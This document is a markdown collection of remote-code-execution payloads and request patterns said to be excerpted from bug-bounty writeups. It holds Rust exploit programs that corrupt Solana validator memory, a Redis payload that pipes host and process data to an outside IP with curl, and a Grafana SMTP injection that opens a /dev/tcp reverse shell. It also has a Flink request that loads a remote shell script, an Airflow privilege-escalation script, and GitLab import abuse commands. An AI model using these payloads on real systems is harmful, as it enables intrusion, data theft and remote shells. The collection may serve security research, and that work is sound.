# Payloads — rce

_Verbatim payload / request patterns extracted from findings in this repo. Nothing invented._

## 1. 🛡️ Critical Solana Vulnerability: Remote Code Execution on Validators
- Source: `telegram writeups (verbatim excerpts)`

```
1pub struct Account {
2    pub lamports: u64,        // Native token balance
3    pub data: Vec<u8>,        // Variable-length state data
4    pub owner: Pubkey,        // Program authorized to modify this account
5    pub executable: bool,     // Whether this account contains executable code
6    pub rent_epoch: Epoch,    // Rent tracking information
7}
```

## 2. 🛡️ Critical Solana Vulnerability: Remote Code Execution on Validators
- Source: `telegram writeups (verbatim excerpts)`

```
1// How programs reconstruct AccountInfo from the serialized data
2pub struct AccountInfo<'a> {
3    pub key: &'a Pubkey,
4    pub lamports: Rc<RefCell<&'a mut u64>>,
5    pub data: Rc<RefCell<&'a mut [u8]>>,  // Points directly into INPUT region!
6    pub owner: &'a Pubkey,
7    pub rent_epoch: Epoch,
8    pub is_signer: bool,
9    pub is_writable: bool,
10    pub executable: bool,
11}
```

## 3. 🛡️ Critical Solana Vulnerability: Remote Code Execution on Validators
- Source: `telegram writeups (verbatim excerpts)`

```
1// Resolved view of AccountInfo with direct field access
2struct CallerAccount<'a> {
3    lamports: &'a mut u64,                  // Direct mutable reference to lamports
4    owner: &'a mut Pubkey,                  // Direct mutable reference to owner
5    original_data_len: usize,               // Track size changes for realloc handling
6    serialized_data: &'a mut [u8],          // Points to serialized data in VM
7    vm_data_addr: u64,                      // VM address of AccountInfo.data pointer
8    ref_to_len_in_vm: &'a mut u64,          // VM address of AccountInfo.data length
9    serialized_len_ptr: *mut u64,
10    executable: bool,
11    rent_epoch: u64,
12}
```

## 4. 🛡️ Critical Solana Vulnerability: Remote Code Execution on Validators
- Source: `telegram writeups (verbatim excerpts)`

```
1use std::{
2    ptr,
3    mem,
4    rc::Rc,
5    cell::RefCell,
6};
7use solana_program::{
8    account_info::AccountInfo,
9    instruction::{
10        AccountMeta,
11        Instruction,
12    },
13    program::invoke_signed,
14    entrypoint::{
15        self,
16        ProgramResult,
17    },
18    pubkey::Pubkey,
19};
20
21entrypoint!(process_instruction);
22
23
24// accounts[0] : LEVERAGE account controlled by ATTACKER and owned by EXPLOIT program 
25// accounts[1] : VICTIM account ATTACKER wants to modify
26// accounts[2] : BENIGN program that owns VICTIM account ATTACKER wants to modify
27pub fn process_instruction(
28    _program_id: &Pubkey,
29    accounts: &[AccountInfo],
30    _instruction_data: &[u8],
31) -> ProgramResult {
32
33    // trigger CoW here to prevent future issues
34    accounts[0].data.borrow_mut()[10] = 2;
35
36    // copy data pointers to force the following cpi update_caller_account to update incorrect region
37    unsafe{
38        ptr::copy(
39            mem::transmute::<&Rc<RefCell<&mut [u8]>>, *const u8>(
40                &accounts[0].data //LEVERAGE
41            ),
42            mem::transmute(
43                mem::transmute::<&Rc<RefCell<&mut [u8]>>, *const u8>(
44                    &accounts[1].data //VICTIM
45                )
46            ),
47            mem::size_of::<Rc<RefCell<&mut [u8]>>>()
48        );
49    }
50    invoke_signed(
51        &Instruction::new_with_bincode(
52            accounts[2].key.clone(),
53            b"",
54            vec![
55                AccountMeta::new(accounts[1].key.clone(), false),
56            ]
57        ),
58        &[
59            accounts[1].clone(),
60        ],
61        &[],
62    )?;
63
64    // this will write to accounts[1].data due to corrupted region.host_addr
65    accounts[0].data.borrow_mut()[10] = 1;
66    Ok(())
67}
```

## 5. 🛡️ Critical Solana Vulnerability: Remote Code Execution on Validators
- Source: `telegram writeups (verbatim excerpts)`

```
1// Trigger copy-on-write for dedicated buffers
2accounts[leverage_idx].data.borrow_mut()[0] = 1;
3accounts[swap_idx].data.borrow_mut()[0] = 1; 
4
5// Resize LEVERAGE to simplify exploit logic
6accounts[leverage_idx].realloc(1, false)?;
```

## 6. 🛡️ Critical Solana Vulnerability: Remote Code Execution on Validators
- Source: `telegram writeups (verbatim excerpts)`

```
1use std::{ptr, mem, rc::Rc, cell::RefCell};
2use solana_program::{
3    account_info::AccountInfo,
4    instruction::{AccountMeta, Instruction},
5    program::invoke_signed,
6    entrypoint,
7    entrypoint::ProgramResult,
8    pubkey::Pubkey,
9};
10
11entrypoint!(process_instruction);
12
13// accounts[0]: SWAP account controlled by ATTACKER, owned by this EXPLOIT program.
14// accounts[1]: POINTER account whose MemoryRegion will point to an arbitrary address.
15// accounts[6]: LEVERAGE account controlled by ATTACKER, owned by this EXPLOIT program.
16
17pub fn process_instruction(
18    program_id: &Pubkey,
19    accounts: &[AccountInfo],
20    _instruction_data: &[u8],
21) -> ProgramResult {
22    if accounts.len() == 8 {
23        let swap_idx = 0;
24        let pointer_idx = 1;
25        let leverage_idx = 6;
26
27        // Prepare LEVERAGE and SWAP accounts to set up memory layout
28        accounts[leverage_idx].data.borrow_mut()[0] = 1;
29        accounts[swap_idx].data.borrow_mut()[0] = 1;
30
31        // Resize LEVERAGE to simplify exploit logic
32        accounts[leverage_idx].realloc(1, false)?;
33
34        // Overwrite SWAP's data pointer with LEVERAGE's pointer
35        unsafe {
36            ptr::copy(
37                mem::transmute::<&Rc<RefCell<&mut [u8]>>, *const u8>(&accounts[leverage_idx].data),
38                mem::transmute::<&Rc<RefCell<&mut [u8]>>, *mut u8>(&accounts[swap_idx].data),
39                mem::size_of::<Rc<RefCell<&mut [u8]>>>(),
40            );
41        }
42
43        // Invoke CPI call to trigger pointer confusion
44        invoke_signed(
45            &Instruction::new_with_bincode(
46                *program_id,
47                b"",
48                vec![AccountMeta::new(accounts[swap_idx].key.clone(), false)],
49            ),
50            &[accounts[swap_idx].clone()],
51            &[],
52        )?;
53
54        // Resize LEVERAGE back to a larger size for memory scanning
55        accounts[leverage_idx].realloc(0xa00000, false)?;
56
57        unsafe {
58            // Scan memory to locate MemoryRegion structure
59            let mut data_ptr = accounts[leverage_idx].data.borrow_mut().as_ptr() as u64 + 0x2840;
60            let arb_ptr = accounts[pointer_idx].data.borrow_mut().as_ptr() as u64;
61
62            loop {
63                // Signature matching to reliably identify MemoryRegion
64                if *((data_ptr + 0x18) as *const u64) == 0x000000040020a238 &&
65                   *((data_ptr + 0x58) as *const u64) == 0x0000000400202908 &&
66                   *((data_ptr + 0x98) as *const u64) == 0x000000040020f308 &&
67                   *((data_ptr + 0xd8) as *const u64) == 0x0000000400000000 {
68
69                    let thread_mem = (*((data_ptr + 0x48) as *const u64) >> 21) << 21;
70
71                    // Overwrite POINTER account's backing buffer pointer (arb_ptr)
72                    *((data_ptr + 0x490) as *mut u64) = thread_mem;
73                    // Set memory region state to writable
74                    *((data_ptr + 0x4b8) as *mut u64) = 1;
75
76                    // At this point, arb_ptr (accounts[pointer_idx]) points to arbitrary memory.
77                    // ROP chain setup would occur here (omitted).
78
79                    return Ok(());
80                }
81
82                // Move to next potential MemoryRegion structure
83                data_ptr += (*((data_ptr + 0x08) as *const u64) >> 4) << 4;
84            }
85        }
86
87        // Note: computation budget exhaustion may be necessary in real-world scenarios
88    }
89
90    Ok(())
91}
92
```

## 7. [] Remote Code Execution at  [CVE-2021-44529] [HtUS]
- Source: `telegram writeups (verbatim excerpts)`

```
GET /client/index.php HTTP/1.1
  Host: ███████
  User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
  Connection: close
  Cookie: ab=ab; c=cGhwaW5mbygpOw==; d=; e=;
  Accept-Encoding: gzip, deflate
```

## 8. Remote code execution due to unvalidated file upload
- Source: `telegram writeups (verbatim excerpts)`

```
<?php
echo "proof of concept (PoC) by aliyugombe@wearehackerone.com";
?>
```

## 9. Remote Code Execution on ownCloud instances with ImageMagick installed
- Source: `telegram writeups (verbatim excerpts)`

```
<svg width="1000" height="1000" 
xmlns:xlink="http://www.w3.org/1999/xlink">
xmlns="http://www.w3.org/2000/svg">       
<image xlink:href="msl:/mnt/data/files/admin/files/exploit.msl" height="500" width="500"/>
</svg>
```

## 10. SMTP Command Injection in Appointment Emails via Newlines
- Source: `telegram writeups (verbatim excerpts)`

```
POST /apps/calendar/appointment/1/book HTTP/2
Host: 192.168.92.132

{"start":1647306900,"end":"1647307200","displayName":"Test User","email":"<BOOKING USER'S EMAIL>","description":"Please accept!\r\n","timeZone":"Asia/Singapore"}
```

## 11. RCE via github import
- Source: `telegram writeups (verbatim excerpts)`

```
lpush resque:gitlab:queue:system_hook_push "{\"class\":\"PagesWorker\",\"args\":[\"class_eval\",\"IO.read('|(hostname; ps aux) | curl 51.75.74.52:11211 -X POST --data-binary @-  ')\"], \"queue\":\"system_hook_push\"}"
```

## 12. RCE via github import
- Source: `telegram writeups (verbatim excerpts)`

```
curl -kv "http://gitlab.example.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: YOUR_GITLAB_TOKEN" \
  --data '{
    "personal_access_token": "ghp_aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa",
    "repo_id": "356289002",
    "target_namespace": "YOUR_GITLAB_USERNAME",
    "new_name": "poc-rce",
    "github_hostname": "http://YOUR_IP:YOUR_PORT"
}'
```

## 13. RCE via github import
- Source: `telegram writeups (verbatim excerpts)`

```
curl "http://gitlab.example.com/api/v4/import/github" \
  --request POST \
  --header "content-type: application/json" \
  --header "PRIVATE-TOKEN: 3LCvKWXVF-Gadcnbxxxx" \
  --data '{
    "personal_access_token": "xxxxx",
    "repo_id": "356289002",
    "target_namespace": "root",
    "new_name": "NEW-NAME-'$(date +%s)'",
    "github_hostname": "http://ns.yvvdwf.me:80"
}'
```

## 14. Apache Flink RCE via GET jar/plan API Endpoint
- Source: `telegram writeups (verbatim excerpts)`

```
GET /jars/145df7ff-c71a-4f3a-b77a-ee4055b1bede_a.jar/plan?entry-class=com.sun.tools.script.shell.Main&programArg=-e,load("https://fs.bugbounty.jarijaas.fi/aiven-flink/shell-loader.js")&parallelism=1 HTTP/1.1
Host: ████
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache
Authorization: Basic █████
sec-ch-ua: " Not A;Brand";v="99", "Chromium";v="96", "Google Chrome";v="96"
Accept: application/json, text/plain, */*
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Safari/537.36
sec-ch-ua-platform: "Windows"
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Language: en-US,en;q=0.9,fi;q=0.8
```

## 15. Grafana RCE via SMTP server parameter injection
- Source: `telegram writeups (verbatim excerpts)`

```
PUT /v1/project/PROJECT_NAME/service/GRAFANA_INSTANCE_NAME HTTP/1.1
Host: console.aiven.io
Connection: keep-alive
Accept: application/json
Authorization: aivenv1 AIVEN_TOKEN_HERE
X-Aiven-Client-Version: aiven-console/3.5.1-1104.g2809991854
Content-Type: application/json
Origin: https://console.aiven.io

{
    "user_config": {
        "smtp_server": {
            "host": "example.org",
            "port": 1,
            "from_address": "x@examle.org",
            "password": "x\r\n[plugin.grafana-image-renderer]\r\nrendering_args=--renderer-cmd-prefix=bash -c bash$IFS-l$IFS>$IFS/dev/tcp/SERVER_IP/4444$IFS0<&1$IFS2>&1"
        }
    }
}
```

## 16. RCE via the DecompressedArchiveSizeValidator and Project BulkImports (behind feature flag)
- Source: `telegram writeups (verbatim excerpts)`

```
PROHIBITED_REFERENCES = Regexp.union(
          /\Acached_markdown_version\Z/,
          /\Aid\Z/,
          /_id\Z/,
          /_ids\Z/,
          /_html\Z/,
          /attributes/,
          /\Aremote_\w+_(url|urls|request_header)\Z/ # carrierwave automatically creates these attribute methods for uploads
        ).freeze
```

## 17. RCE via the DecompressedArchiveSizeValidator and Project BulkImports (behind feature flag)
- Source: `telegram writeups (verbatim excerpts)`

```
wait_for_archived_file do
          validate_decompressed_archive_size if Feature.enabled?(:validate_import_decompressed_archive_size)
          decompress_archive
        end

      def wait_for_archived_file
        MAX_RETRIES.times do |retry_number|
          break if File.exist?(@archive_file)

          sleep(2**retry_number)
        end

        yield
      end
```

## 18. Airflow Daemon Mode Insecure Umask Privilege Escalation
- Source: `telegram writeups (verbatim excerpts)`

```
#!/bin/bash
TARGET=/home/airflow
umask 0
cd $TARGET/logs/scheduler/latest/native_dags/example_dags
rm example_bash_operator.py.log
ln -s $TARGET/dags/poc.py example_bash_operator.py.log
until [ -f $TARGET/dags/poc.py ]
do
  sleep 1
done
rm example_bash_operator.py.log
(cat <<'EOF'
import os
os.system("id >>/tmp/pwned")
from airflow import DAG
EOF
) > $TARGET/dags/poc.py
```

## 19. CVE-2022-40127
- Source: `telegram writeups (verbatim excerpts)`

```
also_run_this = BashOperator(
        task_id='also_run_this',
        bash_command='echo "run_id={{ run_id }} | dag_run={{ dag_run }}"',
    )
```
